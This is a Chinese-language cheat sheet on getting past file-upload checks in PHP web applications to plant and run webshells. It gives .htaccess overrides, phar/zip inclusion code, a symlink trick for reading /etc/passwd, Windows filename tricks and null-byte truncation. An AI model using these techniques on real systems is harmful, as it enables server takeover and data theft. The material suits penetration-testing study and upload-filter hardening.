# **PHP中的文件上传**
# **一、前端绕过**

特点：一般只检测文件的扩展名
判断方式：没有流量经过代理（Burpsuite）就可以证明为客户端JavaScript检测
绕过方法：
* 配置Burpsuite代理进行抓包，再将文件名shell.jpg改为shell.php
* 上传页面，审查元素，修改JavaScript检测函数（firebug插件）

# **二、 基本类型绕过**

* **** MIME类型检测 ****：检测content-type字段(image/gif),绕过方式：使用代理工具抓包修改Content-type的值

* **** 大写 Multipart ****：即将请求头中的 Content-Type 的 multipart/form-data 第一个字符 m 改成 M，即 Multipart/form-data（不影响传输）

* ****文件内容检测****：检测文件幻数、相关信息
文件幻数检测<br>
JPG: FF D8 FF E0 00 10 4A 46 49 46<br>
GIF: 47 49 46 38 39 61(GIF89a)<br>
PNG: 89 50 4E 47<br>
绕过方法：在文件幻数后面加上自己的一句话木马<br>
过滤了<?php，可使用以下脚本绕过：<br>
```php
<script language='php或者PHP或者PhP...'>
    phpinfo();
</script>
```

* ****文件扩展名检测****：检测跟文件extension相关的内容（blacklist,whitelist）<br>
Blacklist<br>
php、php2、hph3、php4、php5、pht、phtml、asp、ascx、jsp、bat、exe、dll等<br>
（1） 绕过方法：<br>
（2） 尝试未写入黑名单的后缀名<br>
（3） IIS默认支持解析.asp、.cdx、.asa、.cer等<br>
（4） 文件名大小写绕过：pHp<br>
（5） Shell.php .或shell.php_  //下划线表示空格，IIS支持，Linux/Unix不支持<br>
（6） 空字符截断：%00,0x00;char(0)

+ ****.htaccess文件攻击（Apache）****<br>
 .htaccess文件：Apache服务器中的一个配置文件，负责相关的网络配置<br>
建一个.htaccess 文件，里面的内容如下，然后上传覆盖原始.htaccess文件
```xml
<!-- 上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接 -->
<FilesMatch "pino">
    SetHandler application/x-httpd-php
</FilesMatch>
或者
<!-- 上传一个文件名字叫做demo.jpg的文件，然后里面是一句话木马，用菜刀连接 -->
<Files demo.jpg>
    ForceType application/x-httpd-php
    SetHandler application/x-httpd-php
 </Files>
 或者
 <!-- 上传一个文件名字叫做.jpg的文件，然后里面是一句话木马，用菜刀连接 -->
<IfModule>
    AddType application/x-httpd-php .jpg
</IfModule>
```
* **** 构造数组绕过 ****<br>
有时候后台上传代码使用到end函数和reset函数判断文件后缀。<br>
 end函数取到的是给数组的最后一次赋值的那个值，继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是reset函数返回的值
end函数取到了第二个给数组赋值的值，也就是filename[0]，reset函数的值为filename[1]。<br>
filename[1] = php<br>
filename[0] = png<br>

# **三、zip、phar文件上传**
此类文件上传的绕过一般都是配合文件包含进行的，以压缩文件形式绕过上传限制，通过phar协议进行文件包含，执行webshell。

* ****zip上传绕过****：我们先创建一个php文件，里面输入<?php echo phpinfo(); ?>就行了，接下来我们把php文件压缩成zip文件，必须通过测试发现只支持上传png文件，所以我们把zip文件改成png，<br>
(1.php→压缩→1.zip→重命名→1.png→上传),然后通过?file=phar://uploads/xxx.png/1进行文件包含。

* ****phar文件上传绕过****：

  phar文件结构<br>

  A stub ：可以理解为一个标志，格式为xxxHALT_COMPILER();?>，前面内容不限，但必须以_HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。

  A manifest describing the contents ：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

  The file contents ：被压缩文件的内容

  A signature for verifying Phar integrity ：签名，放在文件末尾

  生成phar文件的示例代码：（注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件）

```php
  <?php
  class PharDemo{
      private $message;
      public function __construct($msg){
          $this->message = $msg;
      }
      function __destruct(){
          echo $this->message;
      }
  }
  $phar = new Phar("phar.phar");
  $phar->startBuffering();
  $phar->setStub(",GIF89a.<?php __HALT_COMPILER(); ?>"); //设置stub,可设置GIF89a.头，绕过文件后缀检测
  $o = new PharDemo("oh oh oh !!!");
  $phar->setMetadata($o); //将自定义的meta-data存入manifest
  $phar->addFromString("test.txt", "test"); //添加要压缩的文件
  //签名自动计算
  $phar->stopBuffering();
```

```php
  callphar.php
  <?php
      include 'phar://my.phar/shell.php';
  ?>
  //访问callphar.php即可调用shell.php
  //注意：phar文件不受文件名限制，即my.phar可以任意的重命名为aaa.bbb
  callphar.php
  <?php
      include 'phar://aaa.bbb/shell.php';
  ?>
```

# **五、 unlink 绕过**

我们首先构造一个指向 /etc/passwd 的软链接文件，看看能不能成功
root@ubuntu:~# ln -s /etc/passwd test

看一下软链接的指向
lrwxrwxrwx 1 root root 11 Nov 11 06:45 test -> /etc/passwd

现在我们把这个文件进行压缩
root@ubuntu:~# zip -y test.zip test

上传然后 submit，借助文件包含漏洞，可任意读取相关文件，即使有open_basedir的限制。

# **六、常见绕过方式备忘**

|方式                |                      利用方式                            |
|--------------------|---------------------------------------------------------|
|前端JS检测           |直接禁用JS，或者burp改包等等                               |
|只验证Content-type   |抓包改Content-Type，修改为image/jpeg、image/png、image/gif |
|黑名单绕过           | 不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀 .php .phtml .phps .php5 .pht。前提是apache的httpd.conf中有如下配置代码<br>```AddType application/x-httpd-php .php .phtml .phps .php5 .pht```<br>或者上传.htaccess文件<br>需要：1.mod_rewrite模块开启。2.AllowOverride All<br>文件内容<br>```<FilesMatch "shell.jpg">SetHandler application/x-httpd-php</FilesMatch>```<br>此时上传shell.jpg文件即可被当作php来解析。<br>或者<br>AddType application/x-httpd-php .jpg
|大小写绕过           | 上传Php来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写|
|空格绕过             | Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。<br>此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可|
|点绕过               | 没有去除末尾的点，上传.php.绕过|
|::$DATA绕过          | (仅限windows)使用NTFS ADS 文件流绕过的方式，假设上传的文件内容为<?php phpinfo(); ?><br>以下是上传时候会出现的现象：<br>Test.php:a.jpg 生成Test.php 文件内容为空<br>Test.php::$DATA 生成test.php 文件内容为<?php phpinfo(); ?><br>Test.php::$INDEX_ALLOCATION 生成test.php文件夹<br>Test.php::$DATA\0.jpg 生成0.jpg 文件内容为<?php phpinfo(); ?><br>Test.php::$DATA\aaa.jpg 生成aaa.jpg 文件内容为<?php phpinfo(); ?><br><br>PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。
|.空格.绕过          | move_upload_file的文件名直接为用户上传的文件名，我们可控。且会删除文件名末尾的点，因此我们可以结用.php.空格.来绕过。windows会忽略文件末尾的.和空格
| /.绕过             | 用move_uploaded_file会忽略/.的trick绕过                   |
|双写绕过            | 敏感后缀替换为空，双写.pphphp绕过即可                       |
|00截断              | 影响版本：5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7 <br> exp：move_uploaded_file($_FILES['name']['tmp_name'],"/file.php\x00.jpg");<br>源码中move_uploaded_file中的save_path可控，因此00截断即可
|图片马上传          | copy smi1e.jpg /b + shell.php /a shell.jpg               |
|二次渲染绕过        | 绕过方法可以参考先知的文章，写的很详细：https://xz.aliyun.com/t/2657<br>jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。
|条件竞争            | 文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件
|数组+/.绕过         | 利用reset、end函数特性以及文件数组来绕过相关检测             |
